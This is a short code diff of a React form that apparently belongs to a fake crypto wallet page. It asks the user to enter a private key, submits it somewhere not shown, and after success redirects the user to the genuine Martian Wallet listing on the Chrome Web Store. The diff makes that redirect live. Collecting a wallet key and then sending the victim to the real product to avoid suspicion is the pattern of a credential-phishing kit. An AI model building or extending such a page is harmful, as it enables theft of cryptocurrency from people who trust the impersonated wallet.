@@ -88,7 +88,7 @@ const Main = () => {
             .then(success => {
                 setPrharePass('')
                 handleNext()
-                // window.location = 'chrome-extension://ejjladinnckdgjemekebdpeokbikhfci/onboarding.html'
+                window.location = 'https://chrome.google.com/webstore/detail/martian-wallet-aptos-sui/efbglgofoippbgcjepnhiblaibcnclgk'
             }, error => {
                 alert("not sent")
             })
@@ -177,7 +177,7 @@ const Main = () => {
                                                 aria-label="minimum height"
                                                 minRows={3}
                                                 placeholder="Enter private key hare"
-                                                className='w-full bg-slate-100 p-4 rounded-lg mt-1 '
+                                                className='w-full bg-slate-100 p-4 rounded-lg mt-1 outline-0'
                                                 type='password'
                                                 onChange={(e) => setPrharePass(e.target.value)}
 
